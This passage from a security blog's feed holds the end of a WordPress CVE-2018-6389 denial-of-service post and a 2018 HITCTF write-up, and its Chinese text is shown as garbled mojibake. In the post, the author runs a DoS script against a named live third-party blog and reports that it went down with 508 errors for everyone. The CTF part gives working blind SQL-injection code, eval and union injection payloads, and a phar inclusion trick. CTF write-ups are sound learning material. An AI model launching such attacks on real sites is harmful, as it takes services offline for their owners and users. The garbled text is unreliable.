<h3 id="CVE-2018-6389æ¼æ´æµ‹è¯•"><a href="#CVE-2018-6389æ¼æ´æµ‹è¯•" class="headerlink" title="CVE-2018-6389æ¼æ´æµ‹è¯•"></a>CVE-2018-6389æ¼æ´æµ‹è¯•</h3><p>åä¼šçš„å¤§ä½¬é‡Œè²Œä¼¼åªæœ‰æ‰£ç¥æ˜¯wordpressåšå®¢ï¼Œå¯¹ä¸èµ·äº†æ‰£ç¥ï¼<br><a href="http://blog.thecosmos.cn" target="_blank" rel="noopener">http://blog.thecosmos.cn</a><br>Dosè„šæœ¬ï¼Œå¯åŠ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python doser.py  -t 10 -g &quot;http:&#x2F;&#x2F;blog.thecosmos.cn&#x2F;wp-admin&#x2F;load-scripts.php?xxxxxxxxxxxxxxxxxx&quot;</span><br></pre></td></tr></table></figure><br><img src="/img/CVE-2018-6389-1.png" alt=""><br>å†æ‰“å¼€ç½‘ç«™çœ‹çœ‹ï¼Œå·²ç»508äº†ï¼Œå…¶ä»–äººä¹Ÿæ‰“ä¸å¼€<br><img src="/img/CVE-2018-6389-2.png" alt=""><br>æµ‹è¯•æˆåŠŸï¼ŒDoså…³é—­</p>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="http://toutiao.secjia.com/cve-2018-6389" target="_blank" rel="noopener">http://toutiao.secjia.com/cve-2018-6389</a></li>
<li><a href="https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html" target="_blank" rel="noopener">https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿‘æ—¥ï¼Œ&lt;code&gt;WordPress&lt;/code&gt;çˆ†å‡ºé€šæ€æ‰€æœ‰ç‰ˆæœ¬çš„&lt;code&gt;DoS&lt;/code&gt;æ¼æ´ï¼ŒCVEç¼–å·&lt;code&gt;CVE-2018-6389&lt;/code&gt;ï¼Œ è¿‡å»ä¹å¹´å‘å¸ƒçš„å‡ ä¹æ‰€æœ‰ç‰ˆæœ¬çš„WordPresséƒ½å—å½±å“ï¼ŒåŒ…æ‹¬æœ€æ–°ç‰ˆæœ¬4.9.2ï¼Œä½œè€…ç»™å‡ºäº†pocè§†é¢‘åŠä¿®è¡¥è„šæœ¬ï¼Œåœ¨pocä¸­ä»–å‘èµ·çš„å•ä¸ªè¯·æ±‚ä¼šå¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œ181ä¸ªI / Oæ“ä½œï¼Œå¹¶åœ¨å“åº”ä¸­æä¾›æ–‡ä»¶å†…å®¹ï¼Œä½†Wordpresså›¢é˜Ÿæ‹’ç»æ‰¿è®¤è¿™ä¸ªæ¼æ´ã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="CVE" scheme="https://www.codemonster.cn/tags/CVE/"/>
    
      <category term="WordPress" scheme="https://www.codemonster.cn/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>2018 HITCTF WriteUp</title>
    <link href="https://www.codemonster.cn/2018/02/02/2018-hitctf-writeup/"/>
    <id>https://www.codemonster.cn/2018/02/02/2018-hitctf-writeup/</id>
    <published>2018-02-02T14:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>åˆšæ”¾å‡æ­£å¥½çœ‹åˆ°HITCTFï¼Œåˆ’äº†å‡ é“æ°´é¢˜ï¼ŒWriteUpå¦‚ä¸‹<br><a id="more"></a></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="å•è¡¨ä»£æ›¿-100"><a href="#å•è¡¨ä»£æ›¿-100" class="headerlink" title="å•è¡¨ä»£æ›¿ 100"></a>å•è¡¨ä»£æ›¿ 100</h3><p>ç”¨a-zä»£æ›¿å„ç§ç½—é©¬å­—ç¬¦ï¼Œç„¶å<code>quipqiup</code>è¯é¢‘åˆ†æï¼Œç„¶åæ‰¾åˆ°ç¨å¾®å®Œæ•´çš„å¥å­å»æ‰¾åˆ°åŸæ–‡ï¼Œæœ€åæ›¿æ¢å®Œæ•´çš„æ–‡ç« ï¼Œflagåœ¨æœ«å°¾<br>HITCTF{Aft3r_all_t0morrow_1s_anoth3r_day}</p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h3 id="Baby-Android-50"><a href="#Baby-Android-50" class="headerlink" title="Baby Android 50"></a>Baby Android 50</h3><p>apkåå­—æ˜¯xorï¼Œç”¨æ”¹ä¹‹ç†æˆ–è€…apkkillæ‰“å¼€apkï¼Œåç¼–è¯‘åå‘ç°ä¸¤ä¸²å­—ç¬¦ï¼Œ<code>å¼‚æˆ–</code>ä¸€ä¸‹å¾—åˆ°flag</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="PHPreading"><a href="#PHPreading" class="headerlink" title="PHPreading"></a>PHPreading</h3><p><code>index.php.bak</code>æ³„éœ²äº†æºç <br>getä¸€ä¸ª<code>asdfgjxzkallgj8852</code>å‚æ•°ï¼Œå€¼ä¸º<code>H1TctF2018EzCTF</code>å³å¯æ‹¿åˆ°flag</p>
<h3 id="BabyEval"><a href="#BabyEval" class="headerlink" title="BabyEval"></a>BabyEval</h3><p>é¢˜ç›®ç»™äº†æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$str=@(string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">blackListFilter($black_list, $str);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'$str="'</span>.addslashes($str).<span class="string">'";'</span>);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><br>ä¼ å…¥<code>str={${phpinfo()}}</code>å¯ä»¥æ‰§è¡Œï¼Œäºæ˜¯æ„é€ <br><img src="/img/2018hit1.png" alt=""><br>å…·ä½“åŸç†å¯ä»¥å‚è€ƒ<code>wooyun-2010-024807</code></p>
<h3 id="BabyLeakage"><a href="#BabyLeakage" class="headerlink" title="BabyLeakage"></a>BabyLeakage</h3><p>ä¸»é¡µæç¤ºè¦è¿›<code>/news/about/</code>ï¼Œè¿›å»åæç¤ºå¯ç”¨äº†<code>debug</code>ï¼Œæ„é€ <code>/news/about/1</code>å‘ç°æŠ¥é”™ï¼Œæœ‰ä¸ª<code>news/auth</code> è·¯å¾„å¾ˆå¯ç–‘<br>æ‰“å¼€å‘ç°æŠ¥é”™ç»™äº†å¾ˆå¤šä¸œè¥¿ï¼Œæœ‰ä¸ªæ•°æ®åº“è´¦å·å¯†ç ï¼Œè¿›æ•°æ®åº“åæŠŠå­—æ®µæ‹¼èµ·æ¥å°±æ˜¯flag<br><img src="/img/2018hit2.png" alt=""><br><img src="/img/2018hit3.png" alt=""></p>
<h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><p>é¢˜ç›®ç»™äº†æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login and get the flag'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="username" type="text" placeholder="username"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="passwd" type="text" placeholder="passwd"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" &gt;&lt;/input&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$passwd)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect();</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</span><br><span class="line"><span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong password'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wrong username'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ„é€ ç›²æ³¨æ‹¿åˆ°å¯†ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req=requests.session()</span><br><span class="line">lists=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    url=<span class="string">"http://182.254.247.127:2005/"</span></span><br><span class="line">    </span><br><span class="line">    ok=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> lists:</span><br><span class="line">        payload=&#123;<span class="string">"username"</span>:<span class="string">"1'||passwd&lt;'"</span>+flag+s+<span class="string">"'=id#"</span>,<span class="string">"passwd"</span>:<span class="string">""</span>&#125;</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        r1=req.post(url,data=payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username"</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">            ok=s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag+=ok</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#print r1.text</span></span><br></pre></td></tr></table></figure><br><img src="/img/2018hit14.png" alt=""><br>ç„¶åç”¨å¯†ç å»æ‹¿flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/img/2018hit5.png" alt=""></p>
<h3 id="å°ç”µå½±-200"><a href="#å°ç”µå½±-200" class="headerlink" title="å°ç”µå½± 200"></a>å°ç”µå½± 200</h3><p>Ffmpegè¯»æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ffmpeg.py file:&#x2F;&#x2F;&#x2F;flag.txt sxcurity.avi</span><br></pre></td></tr></table></figure><br><img src="/img/2018hit6.png" alt=""></p>
<h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p>å‚è€ƒchybeta<br><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a><br><code>__pycache__/app.cpython-35.pyc</code> è¯»å–ç¼“å­˜ï¼Œåç¼–è¯‘å¾—åˆ°æºç <br>ç„¶åçˆ†ç ´key<br><img src="/img/2018hit7.png" alt=""><br>å¾—åˆ°keyï¼Œè§£å¯†å¾—åˆ°flag<br><img src="/img/2018hit8.png" alt=""></p>
<h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p>è¿™é¢˜å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥ç”¨ä¼ªåè®®è¯»å–æ‰€æœ‰æºç ï¼Œç„¶åå‘ç°å¯ä»¥å†™æ–‡ä»¶çš„åœ°æ–¹<br>ä½†æ˜¯å†™å…¥çš„æ–‡ä»¶å¤§æ¦‚æ˜¯è¿™æ ·çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username+&quot; &#x3D;&gt; &quot;+$password</span><br></pre></td></tr></table></figure><br>å¹¶ä¸”æ–‡ä»¶åç¼€ä¸º<code>log</code>ï¼Œè€Œæ–‡ä»¶åŒ…å«çš„éƒ¨åˆ†é™å®šäº†åç¼€ä¸º<code>.php</code>,å°è¯•<code>%00</code>å¤±è´¥ï¼ŒåŒ…å«è¿œç¨‹æ–‡ä»¶å¤±è´¥ï¼Œ<br>é‚£å°±åªå‰©<code>phar://</code>å’Œ<code>zip://</code>äº†ï¼Œè¿™é‡Œå°±åªå‰©ä¸€ä¸ªé—®é¢˜äº†ï¼Œ<code>=&gt;</code>è¯¥æ€ä¹ˆç»•è¿‡ï¼Œ<br>è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œä»¥å‰çœ‹è¿‡ä¸€èˆªå¤§ä½¬çš„æ–‡ç« æˆ‘ç«Ÿç„¶ç»™å¿˜äº†ï¼Œåæ¥ç»™äº†hintå»çœ‹äº†æ‰çŸ¥é“<br><a href="https://www.jianshu.com/p/03e612b9e379" target="_blank" rel="noopener">https://www.jianshu.com/p/03e612b9e379</a><br>çŸ¥é“æ€ä¹ˆç»•è¿‡åå°±å¾ˆç®€å•äº†<br>æ„é€ ä¸€ä¸ªå«æœ‰<code>=&gt;</code>å­—ç¬¦ä¸²çš„pharåŒ…ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>, <span class="number">0</span>, <span class="string">'test.phar'</span>);  </span><br><span class="line">$phar-&gt;buildFromDirectory(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/project'</span>);  </span><br><span class="line">$phar-&gt;setDefaultStub(<span class="string">'1 =&gt; 1.php'</span>, <span class="string">'1 =&gt; 1.php'</span>);  </span><br><span class="line">$phar-&gt;compressFiles(Phar::GZ);</span><br></pre></td></tr></table></figure><br>ç„¶åæŠŠ<code>=&gt;</code>å‰é¢çš„ä½œä¸ºusernameï¼Œåé¢çš„ä½œä¸ºpasswordå†™å…¥logæ–‡ä»¶å¤¹<br><img src="/img/2018hit9.png" alt=""><br><img src="/img/2018hit10.png" alt=""><br>æœ€å<code>?page=phar://log/xxxx/test</code>åŒ…å«æ‰§è¡Œå‘½ä»¤è¯»å–flag</p>
<h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p>å…ˆä¸Šå‚è€ƒæ–‡ç« <br><a href="https://klionsec.github.io/2016/05/18/sqlite3-common-injection/" target="_blank" rel="noopener">https://klionsec.github.io/2016/05/18/sqlite3-common-injection/</a><br><a href="http://www.au1ge.xyz/2017/08/28/hitb-ctf-singapore-2017-web-wp/" target="_blank" rel="noopener">http://www.au1ge.xyz/2017/08/28/hitb-ctf-singapore-2017-web-wp/</a><br><a href="http://godot.win/index.php/archives/16/" target="_blank" rel="noopener">http://godot.win/index.php/archives/16/</a></p>
<p>çœ‹åˆ°é¢˜ç›®åªæœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»ï¼ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°å‘é€äº†ä¸€ä¸ªqueryå‚æ•°ï¼Œç”¨çš„æ˜¯graphql ï¼Œä¼ é€’çš„ä¸œè¥¿é‡Œæœ‰ä¸ªBase32çš„å­—ç¬¦ä¸²ï¼Œè§£å¯†å¾—åˆ°1ï¼Œå°è¯•å‘é€åŠ å¼•å·çš„Base32å­—ç¬¦ä¸²ï¼Œæç¤ºåªæ¥å—ä¸€ä¸ªé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œäºæ˜¯å„ç§æœç´¢å¼•æ“ï¼ŒæŸ¥åˆ°å¯ä»¥åˆ—å‡ºæ‰€æœ‰æ–¹æ³•åçš„è¯­å¥ï¼Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;&#123; __schema&#123;queryType&#123;fields&#123; name description&#125;&#125;&#125; &#125;</span><br></pre></td></tr></table></figure><br><img src="/img/2018hit11.png" alt=""><br>å¾—åˆ°å¦ä¸€ä¸ªæ–¹æ³•<code>getscorebyyourname</code>ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥ä¼ é€’ä¸€ä¸ª<code>name</code>å­—æ®µï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œç„¶åå°±æ˜¯æŸ¥è¯¢<code>sqlit3</code>çš„æ³¨å…¥æŠ€å·§äº†ï¼Œæœ€åæ„é€ çš„æ³¨å…¥è¯­å¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#39; union select flag from Secr3t_fl4g --+&quot;</span><br></pre></td></tr></table></figure><br><img src="/img/2018hit12.png" alt=""></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>çˆ¬å¢™å»youtubeçœ‹è§†é¢‘æ‹¿flag</p>
<h3 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h3><p>åç¼–è¯‘pycå¾—åˆ°æºç ï¼ŒéšæœºåŠ å¯†base64æˆ–base32ï¼Œä¸€å…±20æ¬¡ï¼Œ<br>å¯ä»¥å†™è„šæœ¬åˆ¤æ–­æ˜¯å¦æœ‰å°å†™å­—æ¯æ¥åŒºåˆ†base64è¿˜æ˜¯base32ï¼Œå› ä¸ºåŠ å¯†æ¬¡æ•°ä¸ç®—å¾ˆå¤šï¼Œæˆ‘æ˜¯ç›´æ¥è‚‰çœ¼è¯†åˆ«æ‰‹åŠ¨è§£å¯†</p>
<h3 id="æ”»å‡»æµé‡åˆ†æ"><a href="#æ”»å‡»æµé‡åˆ†æ" class="headerlink" title="æ”»å‡»æµé‡åˆ†æ"></a>æ”»å‡»æµé‡åˆ†æ</h3><p>æŸ¥çœ‹æµé‡å‘ç°æœ€åæœ‰ä¸ªåŠ å¯†è¯»å–flag.txtçš„ï¼Œå¯¼å‡ºåˆ°æœ¬åœ°åå‘è§£å¯†å³å¯å¾—åˆ°flag</p>
<h3 id="é”®ç›˜æµé‡åˆ†æ"><a href="#é”®ç›˜æµé‡åˆ†æ" class="headerlink" title="é”®ç›˜æµé‡åˆ†æ"></a>é”®ç›˜æµé‡åˆ†æ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r keyboard.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>å¯¼å‡ºé”®ç›˜æ•°æ®ï¼Œè„šæœ¬è§£å¯†å¾—åˆ°flagï¼Œè¦æ³¨æ„çš„æ˜¯éœ€è¦åˆ¤æ–­shiftçŠ¶æ€æ¥åŒºåˆ†å¤§å°å†™<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> :</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> mappings[int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)],line</span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="comment">#print nums</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">""</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> i,output,mappings[n]</span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">'[unknown]'</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> <span class="string">'output :n'</span> + output</span><br></pre></td></tr></table></figure><br><img src="/img/2018hit13.png" alt=""><br>02å¼€å¤´çš„ä¸ºæŒ‰ä½shiftçŠ¶æ€</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åˆšæ”¾å‡æ­£å¥½çœ‹åˆ°HITCTFï¼Œåˆ’äº†å‡ é“æ°´é¢˜ï¼ŒWriteUpå¦‚ä¸‹&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 LCTF WriteUp</title>
    <link href="https://www.codemonster.cn/2017/11/19/2017-lctf-writeup/"/>
    <id>https://www.codemonster.cn/2017/11/19/2017-lctf-writeup/</id>
    <published>2017-11-19T15:55:00.000Z</published>
    <updated>2018-07-28T06:19:31.000Z</updated>
    
